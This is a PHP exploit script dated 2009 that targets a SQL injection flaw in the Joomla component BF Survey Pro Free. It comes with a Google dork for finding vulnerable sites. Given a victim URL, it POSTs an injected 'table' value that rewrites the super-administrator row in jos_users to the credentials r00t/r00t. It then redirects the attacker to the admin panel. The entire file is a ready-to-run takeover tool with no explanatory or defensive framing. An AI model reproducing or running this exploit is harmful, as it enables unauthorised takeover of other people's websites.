&lt;?php
 echo '&lt;h2&gt;Joomla Component BF Survey Pro Free SQL Injection Exploit&lt;/h2&gt;';
 echo '&lt;h4&gt;jdc 2009&lt;/h4&gt;';
 echo '&lt;p&gt;Google dork: inurl:com_bfsurvey_profree&lt;/p&gt;';
   ini_set( &quot;memory_limit&quot;, &quot;128M&quot; );
   ini_set( &quot;max_execution_time&quot;, 0 );
   set_time_limit( 0 );
   if( !isset( $_GET['url'] ) ) die( 'Usage: '.$_SERVER['SCRIPT_NAME'].'?url=www.victim.com' );
   $vulnerableFile = &quot;http://&quot;.$_GET['url'].&quot;/index.php&quot;;
   $url = $vulnerableFile;
 $data = array();
 $data['option'] = 'com_bfsurvey_profree';
 $data['task'] = 'updateOnePage';
 $data['table'] = &quot;jos_users set username=CHAR(&quot;.sqlChar( 'r00t' ).&quot;), password=CHAR(&quot;.sqlChar( md5('r00t' ) ).&quot;), email=CHAR(&quot;.sqlChar( 'x' ).&quot;) where gid=25 limit 1   --   '&quot;;
 $output = getData();
 die( '&lt;script&gt;alert(&quot;Now log in as r00t/r00t!&quot;);location.href=&quot;http://'.$_GET['url'].'/administrator/index.php&quot;;&lt;/script&gt;' );
 function shutUp( $buffer ) { return false; }
 function sqlChar( $str ) { return implode( ',', array_map( 'ord', str_split( $str ) ) ); }
 function getData()
 {
   global $data, $url;
   ob_start( &quot;shutUp&quot; );
   $ch = curl_init();
   curl_setopt( $ch, CURL_TIMEOUT, 120 );
   curl_setopt( $ch, CURL_RETURNTRANSFER, 0 );
   curl_setopt( $ch, CURLOPT_URL, $url );
   if( count( $data ) &gt; 0 )
   {
           curl_setopt( $ch, CURLOPT_POST, count( $data ) );
           curl_setopt( $ch, CURLOPT_POSTFIELDS, http_build_query( $data ) );
   }
   curl_setopt( $ch, CURLOPT_USERAGENT, &quot;Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)&quot; );
   curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1 );
   $result = curl_exec( $ch );
   curl_close( $ch );
   $return = ob_get_contents();
   ob_end_clean();
   return $return;
 }
?&gt;
